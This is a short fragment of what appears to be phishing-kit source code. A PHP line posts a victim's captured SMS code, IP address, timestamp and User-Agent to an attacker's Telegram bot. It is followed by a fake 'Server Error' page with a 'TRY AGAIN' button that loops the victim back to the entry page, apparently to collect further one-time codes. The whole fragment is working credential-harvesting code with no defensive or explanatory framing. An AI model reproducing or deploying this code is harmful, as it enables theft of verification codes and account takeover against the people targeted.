...
@file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$admin."&parse_mode=markdown&text=🔔 Получили SMS %0A *├ IP:* `".$_SERVER['REMOTE_ADDR'].'`%0A *├ Время:* `'.date("H:i:s").'`%0A *├ Дата:* `'.date("d.m.y").'`%0A *├ SMS:* `'.$sms.'`%0A *└ User-Agent*: '.$_SERVER['HTTP_USER_AGENT']);
}
?>
...
<center><p class="MuiTypography-root auth-title MuiTypography-body1"><span>Server Error</span></p></center>
                     <a href='javascript: document.location.href = "<?php echo $ssl; ?>://<?php echo $_SERVER['HTTP_HOST']; ?>/index.php";' id="crydollar" class="MuiButtonBase-root MuiButton-root auth-button MuiButton-contained MuiButton-containedPrimary MuiButton-disableElevation MuiButton-fullWidth" tabindex="0" type="button"><span class="MuiButton-label">TRY AGAIN</span><span class="MuiTouchRipple-root"></span></a>
